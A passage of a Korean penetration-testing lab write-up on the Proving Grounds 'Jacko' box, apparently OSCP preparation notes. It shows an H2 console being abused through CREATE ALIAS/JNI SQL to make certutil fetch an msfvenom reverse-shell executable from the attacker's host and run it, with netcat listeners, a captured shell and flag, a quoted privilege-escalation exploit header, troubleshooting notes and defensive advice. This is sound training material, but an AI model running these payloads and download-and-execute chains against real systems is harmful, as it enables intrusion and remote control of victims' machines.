┌──(kali㉿kali)-[~/PG/Jacko]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

### 전송 — HTTP + certutil

Kali 쪽에서 `~/PG/Jacko` 를 그대로 서빙했다.

![[Pasted image 20260710161044.png]]
```
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.66 - - [10/Jul/2026 16:10:29] "GET /reverse.exe HTTP/1.1" 200 -
192.168.120.66 - - [10/Jul/2026 16:10:29] "GET /reverse.exe HTTP/1.1" 200 -
```
출처: `파일보관/Pasted image 20260710161044.png`

같은 초에 GET 이 두 번 찍혔다. **이건 certutil 의 정상 동작이다** — `certutil -urlcache -split -f` 한 번이 GET 두 번을 낸다. 확인 방법은 간단하다: Kali 에 `python3 -m http.server` 를 띄우고 Windows 에서 같은 명령을 쳐보면 매 호출마다 같은 초에 두 줄이 찍힌다(파일 크기 1KB·7.7KB·238KB·5MB 로 8회 시도, 전부 재현. Windows 11 26200 기준이고 타겟의 Windows 10 1909 에서 따로 재확인하지는 않았다).

즉 16:10:29 의 두 줄은 다운로드 두 번이 아니라 한 번이다. 실패나 재시도의 흔적으로 읽으면 안 된다.

이 화면이 중요한 이유는 따로 있다. **16:10:29 시점에 타겟이 이미 Kali 에서 파일을 가져갔다** — 아래 certutil 스크린샷(16:29)보다 19분 이르다. 즉 §2 의 3단계 체인은 16:10 이전에 이미 한 번 돌아갔고, 아래 화면들은 그 뒤의 두 번째 시도다. 코드 실행이 성립한 시각의 하한이 여기서 정해진다.

`sudo` 없이 80 번에 붙은 것이 의아하면, 이 Kali 는 특권 포트 하한이 풀려 있다:

```bash
┌──(kali㉿kali)-[~]
└─$ sysctl net.ipv4.ip_unprivileged_port_start
net.ipv4.ip_unprivileged_port_start = 0
```

기본값(1024)인 머신에서는 `sudo` 가 필요하다. 배포판마다 다르니 안 뜨면 여기부터 본다.

타겟 쪽 다운로드는 §2 의 프리미티브를 통해 실행했다.

![[Pasted image 20260710162803.png]]

CSVWRITE 로 DLL 을 투하하고,

![[Pasted image 20260710162836.png]]

`System_load` 로 로드한다. 응답이 `null` 인 것이 정상이다 — `System.load` 는 반환값이 없다. **여기서 "null 이니까 실패했다"고 판단하면 안 된다.** 예외가 안 났다는 것이 성공의 신호다.

그리고 certutil:

![[Pasted image 20260710162931.png]]
```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.215/reverse.exe C:/Windows/Temp/reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```
반환된 문자열(`(1 row, 1188 ms)` — certutil 이 1.2초 만에 끝났다):
```
**** Online ****
  000000  ...
  03a200
CertUtil: -URLCache command completed successfully.
```
출처: `파일보관/Pasted image 20260710162931.png` (16:29:31). `...` 은 certutil 자신이 찍은 진행 표시이고 내가 생략한 것이 아니다.

`getInputStream()` 으로 stdout 을 받아온 덕에 **certutil 의 성공 여부를 그 자리에서 확인할 수 있었다.** 블라인드로 던지고 결과를 모르는 것과 다르다.

> [!danger] 이 화면에 이 박스에서 가장 비쌌던 실수가 찍혀 있다
> `03a200` 은 certutil 이 마지막으로 찍은 **바이트 오프셋**, 곧 받은 파일의 크기다. 0x03a200 = **238,080 바이트**. (이 읽는 법은 certutil 문서에서 확인한 것이 아니라 §6 에서 그 값이 실제 msfvenom 산출물 크기와 **정확히 일치**하는 것으로 뒷받침된다.)
>
> 그런데 이 박스에서 최종적으로 통한 `reverse.exe` 는 **7,680 바이트**다. 크기가 31배 다르다. 즉 16:29 에 타겟이 받아간 것은 나중에 셸을 준 그 파일이 **아니다.** 무엇인지는 §6 에서 특정한다.
>
> 성공 메시지를 받았고, 파일도 실제로 생겼고, 그런데 **엉뚱한 파일**이었다. 화면에 답이 찍혀 있었는데 아무도 안 읽었다.

플래그 해설. **여기는 통설이 틀린 곳이라 직접 때려보고 적는다** — Kali 에 `http.server` 를 띄우고 Windows 에서 각 조합을 실행해 확인했다.

| 플래그 | 실제 역할 | 빼면 |
|---|---|---|
| `-urlcache` | URL 캐시 하위명령 진입 | 다운로드 기능 자체가 없다 |
| `-f` | 온라인 반입을 강제하고 캐시를 갱신한다 | `**** OFFLINE ****` 를 찍고 아무것도 받지 않는다. 출력 파일은 0바이트거나 캐시 잔해가 들어간다. 사실상 **필수 플래그** |
| `-split` | 문서상 역할은 "포함된 ASN.1 요소를 분리해 파일로 저장"(`certutil -urlcache -?`) | **아무 차이 없다.** 평범한 바이너리라면 `-split` 없이도 지정 경로에 그대로 떨어진다 |

> [!warning] `-split` 이 파일을 떨어뜨린다는 설명은 틀렸다
> 인터넷의 LOLBin 치트시트가 대개 그렇게 적어놨다. 실측은 다르다 — `certutil -urlcache -f <URL> out.bin` 만으로도 `out.bin` 이 원본과 동일하게 생성된다. 관용구에 `-split` 이 늘 붙어 있는 것은 관성이지 필요조건이 아니다.
>
> 빠지면 실제로 망하는 쪽은 **`-f`** 다. 없으면 오프라인 모드로 떨어져 HTTP 요청 자체가 나가지 않는다. 리버스셸이 안 붙을 때 "certutil 은 성공했는데?" 하고 헤매는 경로가 여기다.
>
> (Windows 11 26200 에서 측정했다. 타겟의 Windows 10 1909 에서 재확인하지는 않았다 — 실제로 두 빌드는 진행 표시가 다르게 나온다. 위 화면의 `000000`·`03a200` 두 줄이 내 Windows 11 certutil 에서는 출력을 리다이렉션하면 아예 안 찍힌다.)

원본 노트에는 일반형 템플릿 한 줄도 남아 있었다(실행 기록이 아니라 메모다):

```
"certutil -urlcache -split -f http://[Kali IP]/shell.exe C:/Windows/Temp/shell.exe"
```

그리고 최종적으로 실행된 경로는 `C:\Users\tony\Desktop\reverse.exe` 다. 원본 노트가 남긴 certutil 명령:

```
"certutil -urlcache -split -f http://192.168.45.215/reverse.exe C:\\Users\\tony\\Desktop\\reverse.exe"
```

**두 certutil 의 목적지가 다르다** — `C:\Windows\Temp` 와 `C:\Users\tony\Desktop`. 그리고 §6 에서 보듯 **내용물도 달랐다.** URL 은 둘 다 `http://192.168.45.215/reverse.exe` 로 같은데, 그 사이에 Kali 쪽 `reverse.exe` 가 교체됐기 때문이다. Desktop 쪽 certutil 이 실행된 화면은 남아 있지 않다.

### 실행

![[Pasted image 20260710170436.png]]
```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```
출처: `파일보관/Pasted image 20260710170436.png` (17:04:36)

이 호출은 **응답이 돌아오지 않는다.** `reverse.exe` 가 종료되지 않으니 `Scanner.next()` 가 끝나지 않고, 콘솔은 계속 도는 상태로 남는다. 셸이 붙었으면 그게 정상이다.

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ rlwrap nc -lnvp 8082
listening on [any] 8082 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.120.66] 50180
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

작업 디렉터리가 `C:\Program Files (x86)\H2\service` 다 — H2 가 Windows 서비스로 돌고 있고, 우리 셸은 그 서비스 프로세스의 자식이다.

> [!danger] `whoami` 가 없다
> 이 셸에서 `whoami` 가 실행되지 않았다. `cmd.exe` 는 떴는데 `whoami.exe` 는 못 찾는다는 뜻이다.
>
> 설명 — msfvenom 의 `shell_reverse_tcp` 는 `CreateProcess` 로 `cmd` 를 띄우는데, `CreateProcess` 의 실행파일 탐색은 **PATH 이전에 시스템 디렉터리(`C:\Windows\System32`)를 먼저 본다.** 반면 `cmd.exe` 가 사용자가 친 `whoami` 를 찾을 때는 **`%PATH%` 만** 쓴다. 그래서 서비스가 PATH 없이(혹은 System32 가 빠진 PATH 로) 기동되면 정확히 이 증상이 나온다 `[가정]` — 이 박스에서 `echo %PATH%` 를 실행한 기록은 없다.
>
> **대처는 절대경로다.** `C:\Windows\System32\whoami.exe`. `net`·`systeminfo`·`icacls`·`reg` 도 마찬가지로 전부 절대경로로 부른다. 여기서 "명령이 없는 박스"라고 판단하고 열거를 포기하면 §4 처럼 된다.

## 4. 권한상승 — 미완

**얻지 못했다.** 산출물과 스크린샷에 남은 것은 여기까지다:

- 셸의 작업 디렉터리 `C:\Program Files (x86)\H2\service`
- `whoami` 실행 실패 → **어느 계정으로 돌고 있는지 끝내 확인하지 못했다**
- `c:\Users` 목록 (아래 §5 스크린샷): `Administrator` · `DefaultAppPool` · `Public` · `tony`

권한에 대해 말할 수 있는 것은 두 가지뿐이다. `local.txt` 를 **읽었고**, certutil 로 `C:\Users\tony\Desktop\reverse.exe` 를 **썼다.** 남의 프로필 디렉터리에 쓸 수 있었으니 H2 서비스는 `tony` 본인이거나 관리자급이다 — 둘 중 어느 쪽인지는 끝내 못 갈랐다 `[가정]`. `whoami /priv`·`systeminfo`·`net user`·`icacls`·서비스 목록 — **어느 것도 실행 기록이 없다.** 리버스셸 안에서 친 명령은 `~/.zsh_history` 에 남지 않으므로 "실행했는데 기록이 없다"일 가능성도 있지만, 마지막 스크린샷이 `local.txt` 를 읽은 17:07:41 이고 그 뒤로 이 박스의 화면이 한 장도 없다. 열거 없이 세션이 끝난 쪽이 정황에 맞는다 `[가정]`.

### 셸을 잡았으면 여기서 쳤어야 할 것

절대경로로 부른다(위 함정 때문).

```
C:\Windows\System32\whoami.exe /all
C:\Windows\System32\systeminfo.exe
C:\Windows\System32\net.exe user
C:\Windows\System32\net.exe localgroup administrators
C:\Windows\System32\sc.exe query state= all
C:\Windows\System32\wbem\wmic.exe service get name,pathname,startmode
```

우선순위는 `whoami /all` 하나다. **`SeImpersonatePrivilege` 가 켜져 있는지 아닌지가 이 박스의 전부**였을 가능성이 크다 — 서비스 계정에서 나온 셸이면 통상 켜져 있다.

### 다음 후보 경로

> [!warning] 아래는 **이 박스에서 관측한 것이 아니다**
> 볼트의 `02. Pentest Essentials.md` §Jacko 에 외부 워크스루(benheater.com) 요약이 들어 있다. 그 요약이 가리키는 경로를 확인 가능한 부분만 검증해 옮긴다.

정석 경로는 비표준 소프트웨어 하나다 — Fujitsu **PaperStream IP (TWAIN)**. Kali 의 exploitdb 에서 실물을 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ head -16 /usr/share/exploitdb/exploits/windows/local/49382.ps1
# Exploit Title: PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
# Exploit Author: 1F98D
# Original Author: securifera
# Date: 12 May 2020
# Vendor Hompage: https://www.fujitsu.com/global/support/products/computing/peripheral/scanners/fi/software/fi6x30-fi6x40-ps-ip-twain32.html
# CVE: CVE-2018-16156
# Tested on: Windows 10 x64
# References:
# https://www.securifera.com/advisories/cve-2018-16156/
# https://github.com/securifera/CVE-2018-16156-Exploit

# A DLL hijack vulnerability exists in the FJTWSVIC service running as part of
# the Fujitsu PaperStream IP (TWAIN) software package. This exploit searches
# for a writable location, copies the specified DLL to that location and then
# triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32
# named pipe.
```

`FJTWSVIC` 서비스가 SYSTEM 으로 돌면서, 이름있는 파이프 `FjtwMkic_Fjicube_32` 로 온 메시지를 받아 DLL 을 로드한다. 익스플로잇 본문의 기본 페이로드 경로는 `$PayloadFile = "C:\Windows\Temp\UninOldIS.dll"` 이고, 파일 상단 주석이 권하는 생성 명령은 **x64** 다:

```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=eth0 LPORT=4444
```

(볼트 요약 쪽은 `-a x86` 으로 적혀 있다. 익스플로잇 자신의 주석과 어긋나므로 **x64 를 먼저 시도**하고 실패하면 바꿔보는 편이 낫다.)

확인 절차는 결국 하나다 — 셸에서 `C:\Program Files (x86)` 과 `C:\Program Files` 를 나열해 **표준 Windows 에 없는 이름**을 찾는 것. H2 도 그렇게 발견됐어야 할 대상이었다.

두 번째 후보는 `SeImpersonatePrivilege` → Potato 계열이다. `whoami /priv` 를 못 봤으니 성립 여부를 말할 수 없다.

## 5. 플래그

```
C:\Users\tony\Desktop\local.txt   dc9bb9f7d40681ebf2db1589d6ca40f0
```

![[Pasted image 20260710170741.png]]
```
 Directory of c:\Users

07/09/2026  11:38 PM    <DIR>          .
07/09/2026  11:38 PM    <DIR>          ..
08/03/2024  05:10 AM    <DIR>          Administrator
07/09/2026  11:38 PM    <DIR>          DefaultAppPool
04/22/2020  04:22 AM    <DIR>          Public
07/10/2026  12:48 AM    <DIR>          tony
               0 File(s)              0 bytes
               6 Dir(s)   6,698,889,216 bytes free

c:\Users>cd tony
cd tony

c:\Users\tony>cd desktop
cd desktop

c:\Users\tony\Desktop>type local.txt
type local.txt
dc9bb9f7d40681ebf2db1589d6ca40f0
```
출처: `파일보관/Pasted image 20260710170741.png` (17:07:41)

명령이 두 번씩 보이는 것은 `shell_reverse_tcp` 로 잡은 셸에서 늘 나오는 현상이다 — `cmd.exe` 가 파이프로 물려 있어 자기 입력을 다시 에코한다. 대화형 셸이라는 표식이기도 하다.

`proof.txt` 는 얻지 못했다. `C:\Users\Administrator\Desktop\proof.txt` 를 시도한 기록도 없다.

> [!warning] 시험 증거 형식
> 이 화면은 **OSCP 제출용으로는 부족하다.** 플래그와 함께 `whoami`·`hostname`·`ip a`(공격자 측 IP 포함)가 **한 화면에** 있어야 한다. 그리고 이 박스에서는 `whoami` 가 PATH 에 없었으니 `C:\Windows\System32\whoami.exe` 로 찍었어야 한다. 습관을 여기서 들여놔야 시험장에서 다시 안 찍는다.

## 6. 막혔던 지점 / 시행착오

### 남아 있는 exe 두 개 — 크기가 같아서 구분이 안 된다

산출물에 exe 가 두 개 남아 있고 **둘 다 정확히 7680바이트**다. 크기가 같아서 육안으로는 구분이 안 되는데, `xxd` 로 뜨면 차이가 두 군데뿐이다:

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ xxd rev.exe > /tmp/r1.hex; xxd reverse.exe > /tmp/r2.hex; diff /tmp/r1.hex /tmp/r2.hex
19c19
< 00000120: f4da 0000 0200 2081 0000 1000 0000 0000  ...... .........
---
> 00000120: fbd0 0000 0200 2081 0000 1000 0000 0000  ...... .........
40c40
< 00000270: 2e6d 7a79 6a00 0000 3002 0000 0050 0000  .mzyj...0....P..
---
> 00000270: 2e62 676f 6500 0000 3002 0000 0050 0000  .bgoe...0....P..
431c431
< 00001ae0: 0049 89e5 49bc 0200 0087 c0a8 2dd7 4154  .I..I.......-.AT
---
> 00001ae0: 0049 89e5 49bc 0200 1f92 c0a8 2dd7 4154  .I..I.......-.AT
```

마지막 줄이 답이다. `49bc` 뒤에 `sockaddr_in` 이 통째로 들어 있다:

| 바이트 | 뜻 | `rev.exe` | `reverse.exe` |
|---|---|---|---|
| `0200` | `AF_INET` | 동일 | 동일 |
| 다음 2바이트 | 포트(네트워크 바이트순) | `0087` = **135** | `1f92` = **8082** |
| 다음 4바이트 | IPv4 | `c0a82dd7` = 192.168.45.215 | 동일 |

앞의 두 차이(`f4da`↔`fbd0`, `.mzyj`↔`.bgoe`)는 페이로드와 무관하다. **완전히 같은 명령을 두 번 돌려도 달라진다** — 확인해봤다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o a.exe
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe > b.exe
┌──(kali㉿kali)-[/tmp]
└─$ md5sum a.exe b.exe
a2984855b58b20ad360abb7f01c20b1f  a.exe
94bae36e4f415f8496aefeefa9ce73c3  b.exe
```
(두 msfvenom 의 배너 출력은 위에서 잘라냈다. 둘 다 `Final size of exe file: 7680 bytes` 였다.)

**md5 로 페이로드를 구분하려 들면 안 된다.** 같은 인자로 만들어도 매번 다른 해시가 나온다(섹션 이름이 무작위고 PE 체크섬이 따라 바뀐다). 어떤 exe 가 어디로 콜백하는지 알고 싶으면 **위처럼 `49bc` 뒤의 sockaddr 을 보는 것**이 유일하게 확실한 방법이다.

히스토리에 남은 msfvenom 은 4444(meterpreter) · 4444 · 8082 · 135 네 판이고, 리스너는 두 개 걸었다:

```
rlwrap nc -lnvp 135
rlwrap nc -lnvp 8082
```

이 박스 구간(히스토리 1792~1810행)에 **4444 리스너도, `multi/handler` 도 없다.** 히스토리 전체를 봐도 `exploit/multi/handler` 는 한 줄도 없고, `msfconsole` 은 211행에 한 번(`sudo msfconsole`) 나오는데 이 박스와 1500행 넘게 떨어진 다른 날의 것이다 — `~/.msf4/history` 에 남은 그 세션 내용도 `ms17_010` 대상 `192.168.141.10` 이라 Jacko 가 아니다. 가장 가까운 `nc -lnvp 4444` 역시 한참 떨어진 다른 박스 구간의 것이다. 이게 다음 절의 실마리다.

### 진짜 원인 — 54분 동안 엉뚱한 파일을 서빙하고 있었다

여기까지가 남아 있는 두 파일 이야기다. 그런데 타겟이 실제로 받아간 것은 **그 둘 중 어느 것도 아니었다.**

§3 의 certutil 화면(16:29)이 마지막에 찍은 오프셋이 `03a200` 이다:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c "print(0x03a200)"
238080
```

238,080 바이트. 남아 있는 두 exe 는 둘 다 7,680 바이트다. 그럼 무엇이 238,080 인가 — 히스토리의 첫 번째 msfvenom 줄을 그대로 다시 돌려봤다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o mtr.exe 2>&1 | tail -3
Payload size: 230982 bytes
Final size of exe file: 238080 bytes
Saved as: mtr.exe
```

**정확히 일치한다.** 16:29 에 타겟이 받아간 `reverse.exe` 는 `windows/x64/meterpreter_reverse_tcp`, **LPORT=4444** 판이었다. 16:10 것도 같은 파일로 본다 — 그 사이에 `~/PG/Jacko` 에서 일어난 쓰기가 하나도 없다(다음 쓰기는 16:46:50 의 `rev.exe`) `[가정]`.

그래서 붙을 수가 없었다. 두 겹으로 틀렸다:

- **포트가 다르다.** 페이로드는 4444 로 콜백하는데 리스너는 135 와 8082 에 걸려 있었다.
- **핸들러 종류가 다르다.** `meterpreter_reverse_tcp` 는 붙자마자 메타스플로잇 프로토콜로 말한다. 4444 에 `nc` 를 걸어놨더라도 **cmd 프롬프트는 안 나온다.** 이건 `multi/handler` + 같은 페이로드 조합이라야 한다.

타임라인이 이렇게 정리된다:

| 시각 | 사건 | 근거 |
|---|---|---|
| ~16:10 이전 | `reverse.exe` = meterpreter/4444 (238,080B) | 위 재현 + certutil 오프셋 |
| **16:10:29** | 타겟이 `/reverse.exe` 를 받아감 (2회) | `http.server` 로그 스크린샷 |
| **16:29:31** | JNI 로 certutil → `C:\Windows\Temp\reverse.exe`, `03a200` | 스크린샷 |
| **16:46:50** | `rev.exe` = shell_reverse_tcp/**135** 생성 | 파일 mtime + 바이트 |
| ? | `rlwrap nc -lnvp 135` → 아무것도 안 옴 | 히스토리 |
| **17:01:44** | `reverse.exe` 를 shell_reverse_tcp/**8082** 로 덮어씀 | 파일 mtime + 바이트 |
| **17:04:36** | Desktop 판 실행 → 8082 에서 셸 | 스크린샷 + nc 출력 |

`rev.exe`(135) 가 타겟에 전달되거나 실행된 흔적은 어디에도 없다.

히스토리에서 msfvenom 세 줄(4444 meterpreter → 4444 shell → 8082 shell)은 붙어 있고 `mkdir Jacko`·`nnmap` **앞에** 놓여 있다. 그대로 읽으면 15:37 이전이 되는데 그럴 수가 없다 — 그랬다면 16:10 에 타겟이 받아간 것이 238KB 가 아니라 7,680바이트여야 한다. 시각을 고정해주는 것은 히스토리가 아니라 파일 mtime 과 스크린샷이고, 그것만 쓰면 이렇게 된다: **meterpreter/4444 판은 16:10:29 이전**, **8082 판은 17:01:44**(`reverse.exe` mtime). 가운데 4444 shell 판은 덮어써져서 시각을 못 박을 근거가 없다 `[가정]`. 세 줄이 연속으로 쳐진 것이 아니라는 것만 확실하다(아래 "히스토리는 시간순이 아니다" 참고).

> [!danger] 리버스셸이 안 붙을 때 페이로드부터 다시 만들지 마라 — **서빙 중인 파일부터 확인하라**
> 16:10 다운로드 → 17:04 셸. **54분**이 여기 들어갔고, 원인은 방화벽도 AV 도 아니라 **Kali 디렉터리에 놓인 파일이 내가 생각한 그 파일이 아니었다**는 것이다. `-o reverse.exe` 를 세 번 쓰면서 무엇이 마지막으로 남았는지를 놓쳤다.
>
> 확인 순서:
> 1. **서빙 디렉터리의 파일이 맞는가** — `ls -l`. 크기 하나면 메타프리터(수백 KB)와 shell_reverse_tcp(7~8KB)가 즉시 구분된다. `xxd | grep` 로 sockaddr 을 봐도 된다.
> 2. **리스너가 그 포트에 실제로 떠 있는가** — `ss -lntp | grep <포트>`. 별개 창의 nc 가 죽어 있는 것이 그다음 빈발 원인이다.
> 3. **SYN 이 나오기는 하는가** — `sudo tcpdump -i tun0 'host <타겟> and tcp[tcpflags] & tcp-syn != 0'`. 안 나오면 타겟이 실행조차 못 한 것이고, 나오는데 안 붙으면 그때가 아웃바운드 필터링이다.
> 4. 그다음에야 포트를 바꾼다 — **443 → 80 → 53**.
>
> **페이로드 파일 이름을 포트째로 지어라.** `rev-8082.exe`·`rev-443.exe`. 같은 이름을 덮어쓰는 순간 이 박스의 54분이 재현된다.

리스너 포트를 타겟의 열린 포트에서 고르지 마라
여기서 고른 8082·135 는 타겟이 인바운드로 열어둔 포트다. 우리가 신경 쓸 것은 타겟에서 밖으로 나가는 방향이고 둘은 아무 관계가 없다. 결과적으로 8082 가 통했지만 근거 있는 선택은 아니었다. 이그레스가 의심되면 443 → 80 → 53 이다.

### 20분짜리 디렉터리 열거는 아무것도 주지 않았다 — 다만 기다리지는 않았다

`whatweb` 15:44 직후 feroxbuster 가 시작해 20분을 돌았고, 나온 58건이 전부 H2 문서였다. 얻은 정보는 0 이다.

그런데 `49384.txt` 의 mtime 이 **15:50:27** 이다. feroxbuster 가 아직 돌고 있을 때 다른 창에서 버전을 알아내고 익스플로잇까지 확보했다는 뜻이다. 이 시점에 1.4.199 라는 값을 어디서 얻었는지는 기록에 없다 — 8082 콘솔을 이미 열어봤거나, nmap 지문의 `[90117-199]` 를 읽었거나 둘 중 하나다 `[가정]`. 어느 쪽이든 **진행을 만든 것은 feroxbuster 가 아니었다.**

일반화하면 — 오래 걸리는 스캔은 걸어두고 **다른 포트를 손으로 만진다.** 특히 nmap 이 이미 제품명을 짚어준 포트가 따로 있을 때는. 스캔이 끝나기를 기다리는 20분은 시험에서 그대로 손실이다.

### 기록의 순서를 믿지 마라 — `~/.zsh_history` 는 시간순이 아니다

히스토리 블록은 이 순서로 적혀 있다:

```
... feroxbuster ... → hostname → msfvenom(rev.exe) → nc 135 → nc 8082 → cd Jacko → searchsploit -m 49384
```

이대로면 `searchsploit` 이 feroxbuster(20분) 이후, 즉 16:05 이후여야 한다. 그런데 `49384.txt` 의 mtime 은 15:50:27 이다. 반증 근거는 `searchsploit` 자신의 소스다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -n -B1 'Copied to' /usr/bin/searchsploit
958-        cp -i "${location}" "$( pwd )/"
959:        echo "Copied to: $( pwd )/$( basename ${location} )"
```

`cp -i` 다 — `-p` 가 아니다. **원본 mtime 을 보존하지 않는다.** 실제로 원본은 2025-12-17 자다:

```bash
┌──(kali㉿kali)-[~]
└─$ ls -la --time-style=full-iso /usr/share/exploitdb/exploits/java/local/49384.txt
-rw-r--r-- 1 root root 125140 2025-12-17 09:16:42.000000000 +0900 /usr/share/exploitdb/exploits/java/local/49384.txt
```

즉 15:50:27 은 **복사가 실제로 일어난 시각**이고, 그때 feroxbuster 는 아직 돌고 있었다. 두 개 이상의 터미널을 병행했다는 뜻이다.

왜 순서가 깨지는지는 설정에 있다. `~/.zshrc` 를 보면 `setopt share_history` 가 주석 처리돼 있고 `EXTENDED_HISTORY` 도 켜져 있지 않다. 그래서 `~/.zsh_history` 에는 타임스탬프가 한 줄도 없고, 각 셸이 **종료할 때 자기 블록을 통째로 덧붙인다.** 파일에 남는 순서는 "친 순서"가 아니라 **"셸이 죽은 순서"** 다.

이 박스 구간이 그 증거다 — `msfvenom ... > rev.exe`(파일 mtime 16:46:50) 가 `searchsploit -m 49384`(15:50:27) 보다 위에 적혀 있다. 붙어 있는 두 줄이라고 같은 세션이라고 믿으면 안 된다.

기록을 되짚을 때의 신뢰 순서
**파일 mtime > 스크린샷 파일명 > 히스토리 순서**. 히스토리는 *무엇을 쳤는지*에는 1차 사료지만 *언제 쳤는지*에는 아니다. 스크린샷 파일명도 붙여넣기 시각이라 캡처 시각과 어긋날 수 있다 — 여기서는 http.server 로그처럼 화면 안에 시각이 찍힌 것이 가장 강한 증거였다.

### `whoami` 가 없어서 열거가 멈췄다

§3 끝의 함정. 셸을 잡은 17:04 이후 남은 것은 `cd`·`dir`·`type` 뿐이다 — 전부 `cmd.exe` 내장 명령이다. 외부 exe 를 하나도 못 부르는 상태에서 열거를 접었을 개연성이 높다 `[가정]`. `C:\Windows\System32\` 를 앞에 붙이는 한 줄이면 풀렸을 문제다.

이 박스가 3분 만에 끝난 것이 아니라 **3분 만에 포기된 것**이다. 17:04 셸 → 17:07 플래그 → 끝.

## 7. OSCP 시험 관점

1. **비표준 고포트의 관리 콘솔이 진짜 입구다.** 80 은 20분짜리 열거를 먹고 아무것도 안 줬고, 8082 는 열자마자 정확한 버전을 줬으며 그 버전이 곧장 익스플로잇으로 이어졌다. `-p-` 로 뽑은 포트 목록에서 **nmap 이 제품명을 붙여준 포트**부터 손으로 열어보는 것이 순서다.
2. **관리 콘솔의 로그인 폼을 만나면 기본값부터.** 여기서는 `sa` / 빈 비밀번호. 볼트에 쌓인 같은 패턴 — Walla `admin:secret`, Extplorer `admin:admin`. 폼을 보면 익스플로잇을 찾기 전에 5초를 기본값에 쓴다.
3. **DB 콘솔을 잡으면 곧장 "파일 쓰기 → 코드 실행"을 찾는다.** H2 는 `CSVWRITE` + `CREATE ALIAS`, MSSQL 은 `xp_cmdshell`, MySQL 은 `INTO OUTFILE` + UDF, PostgreSQL 은 `COPY ... PROGRAM`. 엔진마다 이름만 다르고 발상은 같다.
4. **시험 규정에 걸리는 곳이 하나도 없다.** 쓴 도구는 `nmap`·`whatweb`·`feroxbuster`(전부 열거 전용) · `searchsploit`(검색) · `msfvenom`·`nc`(허용). 익스플로잇 본문은 손으로 붙여넣는 SQL 세 덩어리라 그 자체가 수동 절차다. `msfconsole`/`multi/handler` 는 이 박스 기록에 없고, `~/.msf4/loot` 도 비어 있다 — meterpreter 페이로드를 **만들기는 했지만 핸들러를 띄운 적이 없다**(그게 §6 의 실패 원인이다).
5. **리버스셸이 안 붙으면 서빙 중인 파일부터 본다.** `ls -l` 한 번이면 됐다 — 238KB 는 메타프리터고 7.7KB 는 `shell_reverse_tcp` 다. 그다음이 리스너 확인, 그다음이 `tcpdump` 로 SYN 확인, 포트 변경은 그다음이다. **페이로드 재생성이 가장 마지막**인데 이 박스에서는 그게 첫 번째였고 54분이 날아갔다. 그리고 페이로드 파일명에 포트를 박아라 — `rev-8082.exe`.
6. **서비스에서 나온 셸은 PATH 부터 의심한다.** `whoami` 가 "not recognized" 면 명령이 없는 게 아니라 **경로가 없는 것**이다. `C:\Windows\System32\` 를 붙여라. 이걸 모르면 셸을 잡고도 열거를 못 한다.
7. **시간 배분.** 15:38 정찰 시작 → 15:50 익스플로잇 확보 → 16:10 타겟이 Kali 에서 파일을 받아감(= 코드 실행 확정) → 17:04 셸 → 17:07 플래그 → 끝. **코드 실행까지 32분, 거기서 셸까지 54분, 셸을 잡은 뒤로는 3분.** 비율이 뒤집혔다 — 권한상승에 쓴 시간은 사실상 0 이다. 셸을 잡은 시점은 시험이라면 시간이 넉넉히 남은 지점이고, 거기서 접으면 플래그 하나짜리로 끝난다. `whoami /all` 과 `C:\Program Files` 나열 두 가지에 최소 20분은 배정했어야 했다.

## 8. 방어 관점

- H2 Console 을 네트워크에 노출하지 않는다. 이 박스는 9092(TCP 서버)에 원격 접속을 막아뒀다 — nmap 지문이 `see -tcpAllowOthers` 라고 알려준 그 설정이다. 그런데 8082 웹 콘솔은 열어뒀다. **절반만 잠갔고, 하필 코드 실행이 되는 쪽이 열려 있었다.** H2 에는 웹 콘솔 쪽에 대응하는 `webAllowOthers` 옵션이 있으므로 그쪽도 같이 꺼야 한다(옵션 이름은 `tcpAllowOthers` 와의 대칭에서 온 것이고, 이 박스에서 설정 파일을 확인하지는 않았다).
- 콘솔에 접근할 수 있으면 그 순간 코드 실행이다. `CREATE ALIAS` 로 임의의 자바 정적 메서드를 SQL 함수로 만들 수 있는 이상, "DB 비밀번호를 강하게" 는 부차적인 대응이다. 접근 제어가 유일한 방어선이다.
- DB 엔진을 SYSTEM 급 계정으로 서비스 등록하지 않는다. 전용 저권한 계정으로 돌리고 그 계정에서 `SeImpersonatePrivilege` 를 뺀다.
- 쓰기 가능 + 실행 가능 경로를 줄인다. `C:\Windows\Temp` 에서의 실행을 AppLocker/WDAC 로 차단하면 이 체인의 ①과 certutil 투하가 동시에 막힌다.
